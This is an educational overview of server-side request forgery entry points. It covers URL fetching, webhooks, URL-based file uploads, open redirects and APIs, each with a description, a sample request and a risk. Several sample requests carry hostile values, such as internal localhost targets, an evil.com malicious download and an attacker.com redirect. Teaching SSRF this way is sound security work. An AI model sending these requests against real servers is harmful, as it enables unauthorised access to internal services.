SSRF Sources:
•  1- URL Fetching / Redirection:Description: When a web application allows users to input URLs or external links, and the server fetches resources from those URLs (e.g., an image, API, or file).

Example:
A URL shortener or image downloader that retrieves a file or content from a user-provided URL.

GET /download?url=https://external.com/file
Risk: Attackers can provide internal URLs or malicious external URLs to gain access to sensitive systems.

•  2- Webhookes: Description: Webhooks allow external services to send requests to your server. These services can be vulnerable to SSRF if not properly filtered.

Example:
A webhook that triggers an internal API request or a system call whenever an event occurs externally.

{
  "event": "user_signup",
  "callback_url": "http://localhost:8080/internal-service"
}

Risk: Attackers can use webhooks to force the server to interact with internal services.

•  3- File Uploader: File Uploaders (with URL Processing)
Description: When a server allows users to upload files and then process URLs (e.g., by downloading a file from a provided URL).

Example:
A file upload tool that retrieves content from a URL specified by the user (e.g., for fetching metadata, images, or files before processing the upload).

POST /upload
Content-Type: multipart/form-data
URL: https://evil.com/malicious.zip

Risk: The server may download a malicious file from an attacker-controlled URL or access internal services via URL-based exploitation.
_________________________________________________________________________________________________________
•  4- Open Redirection: Description: An open redirection vulnerability allows an attacker to redirect the server to an arbitrary location.

Example:
A URL parameter that redirects the server to a different location based on user input.

GET /redirect?url=https://attacker.com

Risk: Attackers can redirect the server to internal IPs or sensitive endpoints (e.g., http://localhost/admin).

_________________________________________________________________________________________________________
•  5- API Services: Description: APIs that interact with third-party services may expose SSRF if the server is able to make requests to arbitrary URLs.

Example:
An API that accepts a URL and fetches information from that URL to return to the client.

GET /api/lookup?url=http://example.com

Risk: Attackers could provide a malicious internal URL (e.g., http://localhost:8080/internal-api) to gain unauthorized access to internal services.
